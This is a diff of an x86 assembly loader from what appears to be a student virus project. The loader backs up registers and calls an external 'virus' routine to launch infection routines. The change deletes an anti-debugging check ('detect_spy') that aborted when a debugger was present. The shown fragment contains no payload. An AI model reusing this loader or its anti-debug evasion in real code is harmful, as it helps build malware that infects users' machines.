@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2020/04/07 20:42:22 by ichkamo          ###   ########.fr        ;
+;    Updated: 2020/06/20 14:51:21 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -17,7 +17,6 @@ section .text
 	global virus_header_struct
 
 extern virus
-extern detect_spy
 
 ;----------------------------------; backup all swappable registers
 ;                                    (all but rax, rsp, rbp)
@@ -35,11 +34,6 @@ loader_entry:
 	push r13                   ; backup r13
 	push r14                   ; backup r14
 	push r15                   ; backup r15
-
-;----------------------------------; run anti debug
-	call detect_spy
-	test rax, rax
-	jnz return_to_client
 
 ;----------------------------------; launch infection routines
 	call virus
